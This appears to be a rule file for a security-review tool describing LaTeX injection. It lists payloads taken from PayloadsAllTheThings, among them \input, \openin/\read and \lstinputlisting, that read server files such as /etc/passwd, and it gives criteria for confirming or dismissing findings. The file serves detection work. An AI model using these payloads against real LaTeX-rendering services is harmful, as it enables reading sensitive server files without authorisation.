# LaTeX Injection — @texbomb skill
> cats: (advisory — no static taint rule yet) · severity: medium
> sources: PayloadsAllTheThings, HackTricks

## What it is
Attackers can read the content of sensitive files on the server.

## Exploit payloads (from PayloadsAllTheThings)
- `\input{/etc/passwd}`
- `\include{somefile} # load .tex file (somefile.tex)`
- `\newread\file`
- `\openin\file=/etc/issue`
- `\read\file to\line`
- `\text{\line}`
- `\closein\file`
- `\lstinputlisting{/etc/passwd}`

## VERIFY
- CONFIRMED when: untrusted input reaches the sink/condition described above and
  NO mitigating control (input validation, allow-list, output encoding, auth/ownership
  check, or safe API) is present in the data path.
- FALSE POSITIVE when: a correct mitigation from Remediation is applied, the value is
  constant / allow-listed, or the matched symbol is a benign same-named API.
- LIKELY when: the dangerous pattern is present but the mitigating control or an exploit
  precondition is not visible in the reviewed code.

## References
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
- HackTricks: https://book.hacktricks.wiki/en/search.html?q=LaTeX%20Injection
- HackTricks Cloud: https://cloud.hacktricks.wiki/
